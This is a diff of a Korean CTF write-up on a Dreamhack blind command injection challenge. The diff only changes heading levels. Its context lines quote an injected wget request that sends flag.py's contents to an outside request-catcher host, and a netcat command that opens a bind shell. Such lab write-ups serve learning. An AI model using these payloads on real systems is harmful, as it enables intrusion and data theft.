@@ -202,7 +202,7 @@ HEAD /?cmd=wget+https://dzmnkob.request.dreamhack.games/?query="$(cat+flag.py)" 
 
 <img width="600" alt="image" src="https://github.com/user-attachments/assets/004127bd-cb3e-450e-89b3-291b0949390e">
 
-# 2. Static File Directory
+## 2. Static File Directory
 
 `flask`를 포함한 다양한 프레임워크 또는 웹 에플리케이션에서는, 여러 정적 리소스를 다루기 위해 **Static File Directory**로 `/static` 경로를 사용한다.
 
@@ -230,7 +230,7 @@ Payload를 전달해준 후, `http://host3.dreamhack.games:10383/static/flag_res
 
 `flask`에는 **Static File Directory**로 `/static` 경로를 사용하기 때문에, `/static`이 아닌 다른 이름의 디렉토리를 생성하여 접근하면, 파일을 출력해주지 않는 것을 주의하자.
 
-# 3. Bind Shell
+## 3. Bind Shell
 
 위 방법은 서버의 특정 port를 열어 공격자가 접속하는 방법이다. [링크](https://velog.io/@buaii/blind-command)의 풀이를 참고하였다.
 
@@ -250,7 +250,7 @@ HEAD /?cmd=nc+-lvp+[portnum] HTTP/1.1
 
 이 부분은 다음에 한번 다시 공부해보자.
 
-# 4. Reverse Shell
+## 4. Reverse Shell
 
 위 방법은 공격자가 특정 port를 열어 서버가 접속하도록 하는 방법이다.
 
